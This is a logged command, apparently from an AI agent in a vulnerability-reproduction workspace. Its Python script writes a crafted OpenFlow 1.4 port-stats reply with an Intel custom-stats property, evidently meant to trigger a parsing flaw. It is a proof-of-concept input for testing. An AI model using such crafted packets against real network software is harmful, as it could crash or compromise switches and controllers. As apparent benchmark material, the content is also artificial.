Running command: cd /workspace/repo-vul/src-vul && python3 - <<'PY'
from pathlib import Path
p=Path('poc.bin')
# Build minimal OpenFlow 1.4 port stats reply with Intel custom property.
# Header: version=4, type=19 (OFPST_PORT_REPLY), length=0x0030, xid=1
b=bytearray()
b += bytes([4,19,0,48])
b += (1).to_bytes(4,'big')
# ofp14_port_stats body (32 bytes)
b += (0).to_bytes(4,'big')  # port_no OFPP_ANY? actually 0 okay for parser
b += (0).to_bytes(4,'big')  # pad
b += (0).to_bytes(4,'big')*2  # duration sec/nsec
b += (0).to_bytes(8,'big')*6  # rx/tx packets/bytes/dropped/errors
# Intel experimenter property header (16 bytes)
b += (0xffff).to_bytes(2,'big')  # type experimenter
b += (24).to_bytes(2,'big')      # length
b += (0x0000AA01).to_bytes(4,'big')
b += (2).to_bytes(4,'big')       # exp_type custom
b += b'\x00\x00'                # pad[2]
b += (1).to_bytes(2,'big')       # stats_array_size = 1
# one counter: name size 0, no name, 8-byte value
b += bytes([0])
b += (0x1122334455667788).to_bytes(8,'big')
p.write_bytes(b)
print(len(b))
